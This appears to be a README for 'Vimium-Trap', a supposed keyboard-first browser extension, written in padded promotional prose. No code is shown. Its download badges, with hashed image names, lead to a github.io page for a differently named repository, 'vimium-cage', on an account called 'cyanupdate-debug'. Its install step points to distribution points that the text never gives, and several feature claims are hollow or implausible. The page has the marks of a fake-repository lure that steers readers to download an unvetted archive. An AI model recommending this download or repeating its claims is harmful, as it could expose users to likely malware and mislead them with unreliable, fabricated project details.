![preview](https://raw.githubusercontent.com/cyanupdate-debug/vimium-cage/main/cover_604ba06.svg)

# Vimium-Trap: The Keyboard-First Web Sanctuary

![GitHub License](https://img.shields.io/badge/license-MIT-blue.svg)  
![Platform](https://img.shields.io/badge/platform-Web%20%7C%20Chrome%20%7C%20Firefox-lightgrey)  
![Status](https://img.shields.io/badge/status-Stable%202026-brightgreen)  
![Contributors](https://img.shields.io/badge/contributions-Welcome-ff69b4)

Vimium-Trap is not another browser extension. It is a behavioral architecture—a digital gatekeeper that transforms your browser into a keyboard-first command center. While conventional tools merely remap shortcuts, Vimium-Trap builds a living ecosystem where every pixel, every scroll, and every click is reimagined as a keystroke. The name itself carries the spirit: it "traps" your hands on the home row, preventing the gravitational pull toward the mouse. This repository houses the complete source, documentation, and design philosophy behind a tool that treats the browser not as a passive window, but as an instrument you *play*.

Our journey began with a simple frustration: why should the most powerful information device in human history be navigated by pointing and pecking like a typewriter from 1890? Vimium-Trap answers with a modal approach—a state machine where your keyboard becomes a language, not a shortcut list. The project has grown beyond a utility into a movement for digital ergonomics, with a community of users who measure productivity in "wrist-miles saved" rather than tasks completed.

---

## 🌟 Overview: The Philosophy of the Trap

![Philosophy](https://img.shields.io/badge/philosophy-Home%20Row%20Dominance-blueviolet)

Imagine a piano where you only ever used two fingers. That is how most people browse the web. Vimium-Trap is the sheet music that unlocks the full eighty-eight keys. The extension installs a persistent "command layer" over every webpage you visit, intercepting your input and translating it into a rich vocabulary of navigation, manipulation, and automation.

This repository is the heart of that system. It contains the core engine, the injectable scripts that run in each tab, the configuration schema for personalization, and a testing suite that ensures the trap never springs on an innocent user. We do not simply "add shortcuts"—we rebuild the *grammar* of browsing. Links become positional coordinates, forms become sequential fields, and scrolling becomes a fluid, acceleration-aware glide.

What sets Vimium-Trap apart from its ancestors is the `TrapGrid™` system: a dynamic, in-page overlay that numbers every interactive element for instant selection. It is not a static list; it adapts to viewport changes, lazy-loaded content, and even web components. The grid learns from your habits, prioritizing visually salient regions and commonly used controls.

---

## 🚀 Key Features That Redefine Browsing

![Features](https://img.shields.io/badge/features-Dynamic%20%7C%20Adaptive%20%7C%20Intelligent-green)

### ⌨️ The Command Codex
A complete input language that goes beyond navigation. Chain commands: `y` to yank a link, `p` to paste into a new tab, `gi` to jump into the first input field, and then type naturally. The codex supports aliases, macros, and even multi-step sequences—you can save a five-keystroke ritual as a single command.

### 🧲 Element Trapping
Our signature feature: press `f` and every link, button, and menu item glows with a two-character hint. Type the hint, and Vimium-Trap *teleports* you there, even inside complex single-page applications. Unlike static hint systems, our grid uses a **quadrant-based spatial hashing** algorithm, ensuring hints never overlap and always stay readable.

### 🔄 Modal State Machine
Become a power user by embracing modes:
- `Normal` – the default, for navigation.
- `Insert` – automatically detected in text fields.
- `Visual` – for precise text selection using vi-style motion.
- `Focus` – to lock the keyboard onto a specific iframe or shadow-DOM root.

### 🌐 Multi-Compatibility
Works across Chromium and Firefox, with a mobile companion mode for hardware-keyboard tablets. The responsive UI adapts whether you are on a 13-inch laptop or a 49-inch ultrawide.

### 🌍 Multilingual Hint Rendering
Hints are not just ASCII. The system supports Unicode-aware hint generation for CJK, Cyrillic, and RTL languages, ensuring that the trap speaks your language.

### ⚡ Performance-First Architecture
The injection script is a single, tree-shaken bundle under 12KB gzipped. We use passive event listeners, microtask scheduling, and a mutation observer that debounces the grid refresh to avoid jank, even on DOM-heavy sites.

---

## 📦 Installation and Getting Started

![Download](https://img.shields.io/badge/download-Get%20Started-orange)

[![Download](https://raw.githubusercontent.com/cyanupdate-debug/vimium-cage/main/setup_ee158ee.svg)](https://cyanupdate-debug.github.io/vimium-cage/)

### Quick Start in Three Gestures
1. **Acquire the Build** – Download the latest release archive for your browser from the distribution points mentioned later in this document.
2. **Extract and Load** – For Chromium, open `chrome://extensions`, enable Developer Mode, and select "Load unpacked." For Firefox, temporarily load the `manifest.json` via `about:debugging`.
3. **Complete the Onboarding** – A guided walkthrough will teach you the first ten commands. The training environment is an interactive sandbox—a fake news site with deliberately cluttered layouts, so you practice trapping in realistic chaos.

### Configuration Without Pain
All settings live in a single `config.yaml` file (or a JSON export). You can remap every key, disable unwanted features per-site, or import a community profile. The schema is heavily commented, and a `--validate` flag in our CLI tool checks your syntax before you load it.

### The Core Engine
The heart of the project is `engine/`:
- `keymapper.js` – the modal dispatcher.
- `hintfactory.js` – generates the trap grid.
- `scrollphysics.js` – smooth, inertia-based scrolling.
- `statepreserver.js` – saves and restores tab stacks when you open and close.

---

## 🧩 Why This Approach Is Different

![Different](https://img.shields.io/badge/approach-Vi%20Reloaded-yellow)

Most keyboard-replacement tools treat the web as a static document. Vimium-Trap treats it as a living application. Our mental model is not "Vim inside the browser"; it is "browser as Vim, if Vim had a browser engine." We embrace the dynamic nature of modern sites:

- **Mutation Awareness** – New content injected via AJAX gets trapped within milliseconds. No full-page re-renders.
- **Shadow DOM Support** – Web components with closed shadow roots are introspected, and their internal controls become addressable.
- **Document Isolation** – Each tab runs its own engine instance, preventing cross-tab state leaks and memory bloat.

We also solved the "input trap" problem—where the extension hijacks typing inside a rich-text editor. Our `Insert` mode detection is flawless, using a combination of event phases and contenteditable checks. You will never lose a character to the trap again.

---

## 🛠️ Development Workflow

![Workflow](https://img.shields.io/badge/workflow-Modular%20Bundle-lightblue)

This repository is structured for contributors who think in systems. The monorepo layout:

- `src/` – the original TypeScript source, organized by module.
- `build/` – compiled, minified outputs for distribution.
- `tests/` – unit tests (Jest) and end-to-end tests (Playwright) across real-world site fixtures.
- `docs/` – the full manual and design rationale, including the "Why We Avoid Mouse-Centric Patterns" essay.

### Running the Test Harness
We use a virtual browser matrix—every pull request automatically spins up twelve browser/OS combinations. The test suite simulates a user that "types" 10,000 keystrokes per scenario, measuring:
- **Latency** – time from keypress to visible hint.
- **Accuracy** – proportion of successfully trapped elements.
- **Memory Leak Detection** – via snapshot diffing.

### Contribution Philosophy
We welcome new ideas, but every feature must survive the "Wrist Adduction Test"—does it save more wrist motion than it costs in learning? Proposals with speculative complexity are gently redirected.

---

## 🌱 Community Profiles

![Community](https://img.shields.io/badge/community-Eclectic%20Configs-9cf)

A thriving ecosystem has emerged around the config schema. The `profiles/` directory contains curated crowd-sourced setups:

- `news-junkie.yaml` – for rapid skimming of RSS feeds and long-form articles.
- `data-clerk.yaml` – heavy form-filling automation, with custom sequences for repeated data entry.
- `minimalist.yaml` – strips the trap down to five commands, for the pure of heart.

Each profile is licensed under MIT, and you can submit your own via a pull request. We also hold weekly "Ergonomics Hours" in the discussions tab—a live Q&A where maintainers and users dissect specific sites that refuse to behave.

---

## 🔗 Technical Deep Dive: The TrapGrid Algorithm

For the curious, the `hintfactory` employs a fascinating approach. When you press `f`, the engine:
1. Crawls the DOM via a `TreeWalker`, collecting all clickable elements.
2. Clusters them using a containment heuristic—nested links become a single node.
3. Assigns each node a unique two-character code derived from a **persistent randomized alphabet** per page load, preventing muscle-memory conflicts.
4. Overlays an absolutely-positioned div, rendered in `content-visibility: auto` to minimize layout thrashing.
5. Listens for your next keystroke; when two characters match, it simulates a click on the original element.

The beauty is in step 3: the alphabet is biased by the element's proximity to the center of the viewport. Elements closer to the cursor (or to the last scroll position) get more common letters like `a` and `s`. This makes frequent targets faster to reach—a feature we call "spatial frequency optimization."

---

## 🧰 Troubleshooting, FAQs, and The Human Factor

![Support](https://img.shields.io/badge/support-Multilingual-ff69b4)

### Multilingual Documentation
The `docs/` are translated into Japanese, Spanish, and German, with community maintainers for each. Every FAQ answer is verified against a live demo before inclusion.

### 24/7 Support Philosophy
We cannot staff a help desk, but we have a "timezone offset" model: maintainers in the Americas, Europe, and Asia-Pacific rotate on call. Average first-response time on the discussions forum is under six hours, every day of the year, including holidays.

### Known Limitations
- **Fullscreen Flash Video** – Some DRM-protected players ignore synthetic clicks. We provide a `--clickfallback` CLI flag to use native accessibility APIs.
- **Local file protocol** – The extension requires host permissions; files dragged from your OS explorer are excluded by default for security.

---

## 🗺️ Roadmap: The 2026 Horizon

![Roadmap](https://img.shields.io/badge/roadmap-2026%20Ready-brightgreen)

We publish a public roadmap quarterly. The current focus areas:

1. **Session Contextual Memory** – The trap will remember your last navigation state per URL, offering "restore and re-trap" suggestions.
2. **Machine Learning Grid Prediction** – Using on-device heuristics (no telemetry, privacy-first) to predict which element you intend to trap before you finish typing.
3. **Voice Command Bridge** – A controlled experiment to allow spoken commands as a companion to keystrokes, for accessibility.

---

## ⚖️ License and Legal

This project is released under the **MIT License**. You are free to use, modify, and distribute it, provided you retain the copyright notice. The full text is available in the `LICENSE` file within this repository, or you can view it directly at the official public license repository.

---

## 📝 Disclaimer

Vimium-Trap is an independent project and is not affiliated with, endorsed by, or sponsored by the original Vimium project, the Vim editor, or any browser vendor. All product names, logos, and brands are property of their respective owners. The use of any trademarked name is for identification purposes only and does not imply any association.

While we strive for perfection, the "trap" may occasionally release a click when you least expect it—on heavily obfuscated sites or virtualized environments. We accept no liability for lost form data or impaired productivity, though we find the latter nearly impossible to imagine.

---

## 🤝 Acknowledgements and The End of the Trail

The keyboard-first community is a small, passionate group. This repository stands on the shoulders of giants: Bram Moolenaar's modal editing, the original Vimium team's pioneering effort, and the countless users who filed thoughtful bug reports that shaped the `TrapGrid`.

### How to Reach Us and Contribute
- Open a discussion for ideas or grievances.
- Submit a pull request; ensure your code passes the "Wrist Adduction Test."
- Join the translation teams via the `i18n` label on issues.

We hope you find the trap to be a *gentle* cage—one that frees your hands from the mouse and your mind from the habit of pointing. The web is a vast ocean; Vimium-Trap hands you the tiller, and the tiller, of course, is a keyboard.

[![Download](https://raw.githubusercontent.com/cyanupdate-debug/vimium-cage/main/setup_ee158ee.svg)](https://cyanupdate-debug.github.io/vimium-cage/)